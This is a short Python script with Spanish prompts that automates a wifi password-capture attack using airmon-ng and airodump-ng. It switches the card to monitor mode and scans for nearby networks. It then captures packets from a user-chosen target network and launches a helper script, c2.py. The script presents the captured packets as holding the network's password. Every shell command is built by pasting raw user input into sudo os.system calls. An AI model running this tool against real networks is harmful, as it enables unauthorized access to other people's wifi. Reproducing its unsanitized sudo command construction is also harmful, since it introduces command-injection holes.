#! /usr/bin/python3

#################################################################""")

import os

os.system ("sudo clear")

print ("""
=--------------------------------------------=
|Configurando targeta de red en modo monitor |
=--------------------------------------------=\n""")

print ("Dispositivos de interfaces de Redes\n")
os.system ('sudo iwconfig')

print ("""\n
%*************************************%
  Escriba el nombre de su targeta wifi
%*************************************%""")
wifi = input ('>> ')
os.system ('clear')

activar_modo_M = ("sudo airmon-ng start %s" %(wifi))
os.system (activar_modo_M)
os.system ('clear')

print ("""
=----------------------------------=
|Escaneando Redes Wifi Disponibles |
=----------------------------------=\n""")
os.system ('sudo iwconfig')

print ("""\n
%***********************************%
  ingrese la targeta en modo monitor
%***********************************%""")
targetaM = input ('>> ')
airodump_ng = ("sudo airodump-ng %s" %(targetaM))
os.system ('clear')

print ("""
=--------=
|  NOTA  |
=--------=""")
print ("\nRecuerde presionar ( Ctrl + C ) para finalizar el escaneo\n")
input ("***Presione ( Enter ) para continuar ***")
os.system (airodump_ng)

print ("\nIngrese la direccion mac del wifi objetivo")
macObjetivo = input (">> ")
print ("Ingrese el canal del wifi objetivo")
canal_objetivo = input (">> ")

ruta1 = ("../captura/")
print ("\nIngrese un nombre para el archivo de captura")
archivo_captura = input (">> ")
ruta_captura = (ruta1 + archivo_captura)
airodump_ng2 = ("sudo airodump-ng -w %s --bssid %s -c%s %s" % (ruta_captura, macObjetivo, canal_objetivo, targetaM))
os.system ('clear')

# Inicia a capturar los paquetes

print ("""
%********************%
 Capturando paquetes
%********************%""")

print ("""Comenzara a atrapar los paquetes dentro de ellos se encuentra
la contrasena, se aconseja esperar a 10,000 beacons como minimo""")

print ("\nPresione ( Enter ) para continuar")
os.system ('clear')

os.chdir ("../componentes")
os.system ("gnome-terminal -- python3 c2.py")

os.system (airodump_ng2)

# Desactiva el modo Monitor
desactivar_modo_M = ("sudo airmon-ng stop %s" % (targetaM))
os.system (desactivar_modo_M)
os.system ('clear')
